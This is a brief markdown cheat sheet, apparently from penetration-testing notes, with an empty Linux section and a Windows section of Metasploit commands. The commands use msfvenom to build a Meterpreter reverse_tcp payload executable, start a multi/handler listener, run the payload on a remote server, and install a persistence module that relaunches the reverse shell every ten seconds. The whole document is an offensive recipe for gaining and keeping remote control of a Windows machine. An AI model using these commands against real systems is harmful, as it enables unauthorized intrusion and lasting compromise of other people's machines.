# Linux

# Windows
## Meterpreter
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
# Send the shell.exe to the remote server

msfconsole -q
use exploit/multi/handler # Create a listener
set payload windows/meterpreter/reverse_tcp
run
# Execute shell.exe on the remote server
background
use exploit/windows/local/persistence # Payload will try to launch a reverse shell every 10s while the server is up
set session 1 # Check sessions to find the right meterpreter shell id
run
```
